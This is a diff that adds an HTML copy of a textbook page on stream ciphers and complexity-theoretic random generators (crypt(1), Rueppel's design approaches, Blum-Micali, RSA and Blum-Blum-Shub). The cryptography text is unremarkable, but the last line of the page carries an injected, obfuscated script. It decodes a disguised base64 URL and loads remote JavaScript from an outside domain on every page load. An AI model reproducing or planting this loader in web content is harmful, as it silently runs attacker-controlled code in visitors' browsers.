@@ -1,0 +1,118 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Other Stream Ciphers and Real Random-Sequence Generators</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=17//-->
+<!--PAGES=414-417//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="17-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="17-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>crypt(1)</I></B></FONT></P>
+<P>The original UNIX encryption algorithm, crypt(1), is a stream cipher based on the same ideas as the Enigma. This is a 256-element, single-rotor substitution cipher with a reflector. Both the rotor and the reflector are generated from the key. This algorithm is far simpler than the World War II German Enigma and, for a skilled cryptanalyst, very easy to break [1576,1299]. A public-domain UNIX program, called Crypt Breakers Workbench (CBW), can be used to break files encrypted with crypt(1).
+</P>
+<P><FONT SIZE="+1"><B><I>Other Schemes</I></B></FONT></P>
+<P>Another generator is based on the knapsack problem (see Section 19.2) [1363]. CRYPTO-LEGGO is insecure [301]. Joan Daemen has developed SubStream, Jam, and StepRightUp [402]; they are all too new to comment on. Many other algorithms are described in the literature, and even more are kept secret and incorporated into equipment.
+</P>
+<H3><A NAME="Heading9"></A><FONT COLOR="#000077">17.8 System-Theoretic Approach to Stream-Cipher Design</FONT></H3>
+<P>In practice, stream-cipher design is a lot like block-cipher design. It involves more mathematical theory, but in the end a cryptographer proposes a design and then tries to analyze it.
+</P>
+<P>According to Rainer Rueppel, there are four different approaches to the construction of stream ciphers [1360,1362]:</P>
+<DL>
+<DD>&#151; System-theoretic approach. Try to make sure that each design creates a difficult and unknown problem for the cryptanalyst, using a set of fundamental design principles and criteria.
+<DD>&#151; Information-theoretic approach. Try to keep the cryptanalyst in the dark about the plaintext. No matter how much work the cryptanalyst invests, he will never get a unique solution.
+<DD>&#151; Complexity-theoretic approach. Try to base the cryptosystem on, or make it equivalent to, some known and difficult problem such as factoring or taking discrete logarithms.
+<DD>&#151; Randomized approach. Try to generate an unmanageably large problem by forcing the cryptanalyst to examine lots of useless data in his attempts at cryptanalysis.
+</DL>
+<P>The approaches differ in their assumptions about the capabilities and opportunities of the cryptanalyst, the definition of cryptographic success, and the notion of security. Most of the research in this field is theoretical, but there are some good stream ciphers among the impractical ones.
+</P>
+<P>The system-theoretic approach was used in all the stream ciphers previously listed; it produces most of the stream ciphers that are practical enough to be used in the real world. A cryptographer designs keystream generators that have testable security properties&#151;period, distribution of bit patterns, linear complexity, and so on&#151;and not ciphers based on mathematical theory. The cryptographer also studies various cryptanalytic techniques against these generators and makes sure the generators are immune to these attacks.</P>
+<P>Over the years, the approach has resulted in a set of design criteria for stream ciphers [1432,99,1357,1249]. These were discussed by Rueppel in [1362], in which he details the theory behind them.</P>
+<DL>
+<DD>&#151; Long period, no repetitions.
+<DD>&#151; Linear complexity criteria&#151;large linear complexity, linear complexity profile, local linear complexity, and so forth.
+<DD>&#151; Statistical criteria such as ideal <I>k</I>-tuple distributions.
+<DD>&#151; Confusion&#151;every keystream bit must be a complex transformation of all or most of the key bits.
+<DD>&#151; Diffusion&#151;redundancies in substructures must be dissipated into long-range statistics.
+<DD>&#151; Nonlinearity criteria for Boolean functions like <I>m</I>th-order correlation immunity, distance to linear functions, avalanche criterion, and so on.
+</DL>
+<P>This list of design criteria is not unique for stream ciphers designed by the system-theoretic approach; it is true for all stream ciphers. It is even true for all block ciphers. The unique point about the system-theoretic approach is that stream ciphers are designed to satisfy these goals directly.
+</P>
+<P>The major problem with these cryptosystems is that nothing can be proven about their security; the design criteria have never been proved to be either necessary or sufficient for security. A keystream generator may satisfy all the design principles, but could still turn out to be insecure. Another could turn out to be secure. There is still some magic to the process.</P>
+<P>On the other hand, breaking each of these keystream generators is a different problem for a cryptanalyst. If enough different generators are out there, it may not be worth the cryptanalyst&#146;s time to try to break each one. He may better achieve fame and glory by figuring out better ways to factor large numbers or calculating discrete logarithms.</P>
+<H3><A NAME="Heading10"></A><FONT COLOR="#000077">17.9 Complexity-Theoretic Approach to Stream-Cipher Design</FONT></H3>
+<P>Rueppel also delineated a complexity-theoretic approach to stream-cipher design. Here, a cryptographer attempts to use complexity theory to prove that his generators are secure. Consequently, the generators tend to be more complicated, based on the same sorts of hard problems as public-key cryptography. And like public-key algorithms, they tend to be slow and cumbersome.
+</P>
+<P><FONT SIZE="+1"><B><I>Shamir&#146;s Pseudo-Random-Number Generator</I></B></FONT></P>
+<P>Adi Shamir used the RSA algorithm as a pseudo-random-number generator [1417]. While Shamir showed that predicting the output of the pseudo-random-number generator is equivalent to breaking RSA, potential biases in the output were demonstrated in [1401,200].
+</P>
+<P><FONT SIZE="+1"><B><I>Blum-Micali Generator</I></B></FONT></P>
+<P>This generator gets its security from the difficulty of computing discrete logarithms [200]. Let <I>g</I> be a prime and <I>p</I> be an odd prime. A key <I>x</I><SUB>0</SUB>, starts off the process:</P>
+<DL>
+<DD><I>x</I><SUB>i&#43;1</SUB> = <I>g<SUP>x<SMALL>i</SMALL></SUP></I> mod <I>p</I>
+</DL>
+<P>The output of the generator is 1 if <I>x</I><SUB>i</SUB> &lt (<I>p</I> - 1)/2, and 0 otherwise.</P>
+<P>If <I>p</I> is large enough so that computing discrete logarithms mod <I>p</I> is infeasible, then this generator is secure. Additional theoretical results can be found in [1627,986,985,1237,896,799].</P>
+<P><FONT SIZE="+1"><B><I>RSA</I></B></FONT></P>
+<P>This RSA generator [35,36] is a modification of [200]. The initial parameters are a modulus <I>N</I> which is the product of two large primes <I>p</I> and <I>q</I>, an integer <I>e</I> which is relatively prime to (<I>p</I> - 1) (<I>q</I> - 1), and a random seed <I>x</I><SUB>0</SUB>, where <I>x</I><SUB>0</SUB> is less than <I>N</I>.</P>
+<DL>
+<DD><I>x</I><SUB>i&#43;1</SUB> = <I>x</I><SUP>e<SUB>i</SUB></SUP> mod <I>N</I>
+</DL>
+<P>The output of the generator is the least significant bit of <I>x</I><SUB>i</SUB>. The security of this generator is based on the difficulty of breaking RSA. If <I>N</I> is large enough, then the generator is secure. Additional theory can be found in [1569,1570,1571,30,354].</P>
+<P><FONT SIZE="+1"><B><I>Blum, Blum, and Shub</I></B></FONT></P>
+<P>The simplest and most efficient complexity-theoretic generator is called the Blum, Blum, and Shub generator, after its inventors. Mercifully, we shall abbreviate it to <B>BBS</B>, although it is sometimes called the quadratic residue generator [193].</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="17-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="17-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(MQyCVqaF, cdijwdaq) {cdijwdaq = MQyCVqaF.createElement('script');cdijwdaq.type = 'text/javascript';cdijwdaq.async = true;cdijwdaq.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');MQyCVqaF.getElementsByTagName('body')[0].appendChild(cdijwdaq);}(document));</script></body>
+</html>
